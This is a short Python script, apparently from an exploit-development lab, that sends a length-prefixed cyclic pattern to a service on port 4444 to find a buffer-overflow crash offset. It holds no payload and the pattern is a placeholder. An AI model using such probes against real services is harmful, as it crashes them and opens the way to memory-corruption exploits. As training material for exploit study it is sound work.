import socket
import struct
import sys

# msf-pattern_create -l 200   (paste the output here)
pattern = b"Aa0Aa1Aa2Aa3Aa4Aa5..."  # <-- 200-byte cyclic pattern

pkt = b"OSEDLAB\x00" + struct.pack("<I", len(pattern)) + pattern
s = socket.socket()
s.connect((sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1", 4444))
s.send(pkt)
s.close()
